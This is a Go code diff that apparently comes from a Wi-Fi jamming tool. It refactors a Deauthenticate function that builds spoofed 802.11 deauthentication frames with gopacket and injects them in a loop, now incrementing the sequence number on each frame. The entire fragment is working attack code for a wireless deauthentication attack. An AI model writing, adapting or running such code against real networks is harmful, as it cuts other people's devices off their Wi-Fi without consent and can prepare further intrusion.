@@ -420,13 +420,13 @@ func	(conn *JamConn)	Deauthenticate(
 	if !OptsG.GuiMode {
 		fmt.Printf("sending %d deauth frames from src %s - to %s\n", count, src.String(), dst.String())
 	}
-	for i = 1; i <= count; i++ {
-		buff = gopacket.NewSerializeBuffer()
-		dot11 := createDot11Header(layers.Dot11TypeMgmtDeauthentication, src, dst,
-			dot11Orig.DurationID, dot11Orig.SequenceNumber + i)
-		mgmt := layers.Dot11MgmtDeauthentication {
-			Reason: reason,
-		}
+	buff = gopacket.NewSerializeBuffer()
+	dot11 := createDot11Header(layers.Dot11TypeMgmtDeauthentication, src, dst,
+		dot11Orig.DurationID, dot11Orig.SequenceNumber + i)
+	mgmt := layers.Dot11MgmtDeauthentication {
+		Reason: reason,
+	}
+	for i = 0; i < count; i++ {
 		if err := gopacket.SerializeLayers(buff, opts,
 			&tap,
 			&dot11,
@@ -437,6 +437,7 @@ func	(conn *JamConn)	Deauthenticate(
 		if err := conn.handle.WritePacketData(buff.Bytes()); err != nil {
 			return errors.New("Handle.WritePacketData() " + err.Error())
 		}
+		dot11.SequenceNumber += 1
 	}
 	return nil
 }
